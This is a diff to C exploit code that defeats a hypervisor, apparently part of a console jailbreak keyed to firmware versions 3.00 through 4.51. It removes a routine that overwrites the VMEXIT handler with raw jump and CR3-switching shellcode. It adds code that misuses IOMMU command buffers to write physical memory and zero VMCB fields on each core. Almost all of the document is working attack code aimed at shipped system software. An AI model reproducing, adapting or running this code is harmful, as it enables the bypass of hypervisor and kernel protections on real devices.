@@ -8,9 +8,15 @@ uint32_t (*hv_iommu_set_buffers)(uint64_t cb2_pa, uint64_t cb3_pa,
 uint32_t (*hv_iommu_wait_completion)(void);
 
 int hv_defeat_0304(volatile shellcode_kernel_args *args_ptr) {
-  uint64_t iommu_cb2_pa = vtophys(args_ptr->dmap_base, args_ptr->iommu_cb2_va);
-  uint64_t iommu_cb3_pa = vtophys(args_ptr->dmap_base, args_ptr->iommu_cb3_va);
-  uint64_t iommu_eb_pa = vtophys(args_ptr->dmap_base, args_ptr->iommu_eb_va);
+  uint64_t softc = *(uint64_t *)args_ptr->iommu_softc;
+  uint64_t mmio_va = *(uint64_t *)(softc + IOMMU_SC_MMIO_VA);
+  uint64_t cb2_va = *(uint64_t *)(softc + IOMMU_SC_CB2_PTR);
+  uint64_t cb3_va = *(uint64_t *)(softc + IOMMU_SC_CB3_PTR);
+  uint64_t eb_va = *(uint64_t *)(softc + IOMMU_SC_EB_PTR);
+
+  uint64_t iommu_cb2_pa = vtophys(args_ptr->dmap_base, cb2_va);
+  uint64_t iommu_cb3_pa = vtophys(args_ptr->dmap_base, cb3_va);
+  uint64_t iommu_eb_pa = vtophys(args_ptr->dmap_base, eb_va);
 
   uint64_t unk;
   int n_devices;
@@ -52,55 +58,26 @@ int hv_defeat_0304(volatile shellcode_kernel_args *args_ptr) {
   return 0;
 }
 
-void patch_hv_0304(void) {
-  // Jump to shellcode final identity mapping
-  uint8_t shellcode_jmp[] = {0x48, 0xC7, 0xC0, 0xAA,
-                             0xAA, 0xAA, 0xAA, // mov rax, 0xAAAAAAAA
-                             0xFF, 0xE0};      // jmp rax
-
-  // Update code cave in hv 1:1 region
-  *(uint32_t *)(&shellcode_jmp[3]) = (uint32_t)args.hv_code_cave_pa;
-
-  // Just patch the VMEXIT handler directly, avoiding all checks
-  memcpy((void *)PHYS_TO_DMAP(args.hv_handle_vmexit_pa), shellcode_jmp,
-         sizeof(shellcode_jmp));
-
-  uint8_t shellcode_identity_and_jmp[] = {
-      0x48, 0xB8, 0xAA, 0xAA, 0xAA,
-      0xAA, 0xAA, 0xAA, 0xAA, 0xAA, // movabs rax, 0xAAAAAAAAAAAAAAAA
-      0x0F, 0x22, 0xD8,             // mov    cr3, rax
-      0x48, 0xB8, 0xAA, 0xAA, 0xAA,
-      0xAA, 0xAA, 0xAA, 0xAA, 0xAA, // movabs rax, 0xAAAAAAAAAAAAAAAA
-      0xFF, 0xE0                    // jmp    rax
-  };
-
-  // Update CR3 PA (from config)
-  *(uint64_t *)(&shellcode_identity_and_jmp[2]) = cave_hv_paging;
-  // Update HV shellcode cave
-  *(uint64_t *)(&shellcode_identity_and_jmp[15]) = cave_hv_code;
-
-  // Install shellcode to update CR3 and jump to main HV shellcode
-  memcpy((void *)PHYS_TO_DMAP(args.hv_code_cave_pa), shellcode_identity_and_jmp,
-         sizeof(shellcode_identity_and_jmp));
-}
-
 __attribute__((noinline, optimize("O0"))) void
 iommu_submit_cmd(volatile shellcode_kernel_args *args_ptr, uint64_t *cmd) {
-  uint64_t curr_tail =
-      *((uint64_t *)args_ptr->iommu_mmio_va + IOMMU_MMIO_CB_TAIL / 8);
+  uint64_t softc = *(uint64_t *)args_ptr->iommu_softc;
+  uint64_t mmio_va = *(uint64_t *)(softc + IOMMU_SC_MMIO_VA);
+  uint64_t cb2_va = *(uint64_t *)(softc + IOMMU_SC_CB2_PTR);
+
+  uint64_t curr_tail = *((uint64_t *)mmio_va + IOMMU_MMIO_CB_TAIL / 8);
   uint64_t next_tail = (curr_tail + IOMMU_CMD_ENTRY_SIZE) & IOMMU_CB_MASK;
 
-  uint64_t *cmd_buffer = (uint64_t *)args_ptr->iommu_cb2_va + curr_tail / 8;
+  uint64_t *cmd_buffer = (uint64_t *)cb2_va + curr_tail / 8;
 
   cmd_buffer[0] = cmd[0];
   cmd_buffer[1] = cmd[1];
 
   __asm__ volatile("" : : : "memory");
 
-  *((uint64_t *)args_ptr->iommu_mmio_va + IOMMU_MMIO_CB_TAIL / 8) = next_tail;
+  *((uint64_t *)mmio_va + IOMMU_MMIO_CB_TAIL / 8) = next_tail;
 
-  while (*((uint64_t *)args_ptr->iommu_mmio_va + IOMMU_MMIO_CB_HEAD / 8) !=
-         *((uint64_t *)args_ptr->iommu_mmio_va + IOMMU_MMIO_CB_TAIL / 8))
+  while (*((uint64_t *)mmio_va + IOMMU_MMIO_CB_HEAD / 8) !=
+         *((uint64_t *)mmio_va + IOMMU_MMIO_CB_TAIL / 8))
     ;
 }
 
@@ -115,10 +92,28 @@ iommu_write8_pa(volatile shellcode_kernel_args *args_ptr, uint64_t pa,
   iommu_submit_cmd(args_ptr, (uint64_t *)cmd);
 }
 
+static uint64_t get_vmcb(volatile shellcode_kernel_args *args_ptr, int core) {
+  switch (args_ptr->fw_version) {
+  case 0x0300:
+  case 0x0310:
+  case 0x0320:
+  case 0x0321:
+    return (uint64_t)0x6290B000 + (uint64_t)core * 0x3000;
+  case 0x0400:
+  case 0x0402:
+  case 0x0403:
+  case 0x0450:
+  case 0x0451:
+    return (uint64_t)0x62A05000 + (uint64_t)core * 0x3000;
+  default:
+    return -1;
+  }
+}
+
 __attribute__((noinline, optimize("O0"))) void
 patch_vmcb(volatile shellcode_kernel_args *args_ptr) {
   for (int i = 0; i < 16; i++) {
-    iommu_write8_pa(args_ptr, args_ptr->vmcb[i] + 0x90, 0);
+    iommu_write8_pa(args_ptr, get_vmcb(args_ptr, i) + 0x90, 0);
   }
 }
 
